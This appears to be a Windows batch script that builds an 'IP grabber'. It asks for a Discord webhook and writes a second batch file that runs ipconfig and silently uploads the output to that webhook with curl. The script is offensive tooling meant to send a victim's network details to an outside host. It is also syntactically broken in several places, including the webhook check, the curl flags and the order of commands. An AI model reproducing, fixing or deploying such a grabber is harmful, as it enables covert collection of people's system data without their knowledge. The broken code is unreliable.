@echo off 
chcp 65001
title ip grabber sakura
color 2

:menu
echo     ██████  ██████   █████  ██████  ██████  ███████ ██████  
echo     ██       ██   ██ ██   ██ ██   ██ ██   ██ ██      ██   ██ 
echo     ██   ███ ██████  ███████ ██████  ██████  █████   ██████  
echo     ██    ██ ██   ██ ██   ██ ██   ██ ██   ██ ██      ██   ██ 
echo     ██████  ██   ██ ██   ██ ██████  ██████  ███████ ██   ██ 
                                                                                                                  
set /p choice=!

if "%choice%"=="1" goto Grabber

:grabber
cls
echo    ▪  ·▄▄▄ ▐ ▄            ▄▄ • ▄▄▄   ▄▄▄· ▄▄▄▄· ▄▄▄▄· ▄▄▄ .▄▄▄  
echo    ██ ▐▄▄·•█▌▐█▪         ▐█ ▀ ▪▀▄ █·▐█ ▀█ ▐█ ▀█▪▐█ ▀█▪▀▄.▀·▀▄ █·
echo    ▐█·██▪ ▐█▐▐▌ ▄█▀▄     ▄█ ▀█▄▐▀▀▄ ▄█▀▀█ ▐█▀▀█▄▐█▀▀█▄▐▀▀▪▄▐▀▀▄ 
echo    ▐█▌██▌.██▐█▌▐█▌.▐▌    ▐█▄▪▐█▐█•█▌▐█ ▪▐▌██▄▪▐███▄▪▐█▐█▄▄▌▐█•█▌
echo     ▀▀▀▀▀▀ ▀▀ █▪ ▀█▄▀▪    ·▀▀▀▀ .▀  ▀ ▀  ▀ ·▀▀▀▀ ·▀▀▀▀  ▀▀▀ .▀  ▀
set /p "webhook=Enter your discord webhook: "

if "%webhook%"--""(
echo discord webhook URL is required.
pause
goto menu

)

echo connection(true) making ip logger script/
timeout /t 5 >nul

echo @echo off > ip_grabber_exec.bat
echo curl --silent --output /dev/null -f 1=@"ip.txt" %webhook% >> ip_grabber_exec.bat
echo ipconfig >ip.txt >> ip_grabber_exec.bat

echo ip grabber script has been created as ip_grabber_exec.bat.
pause
goto menu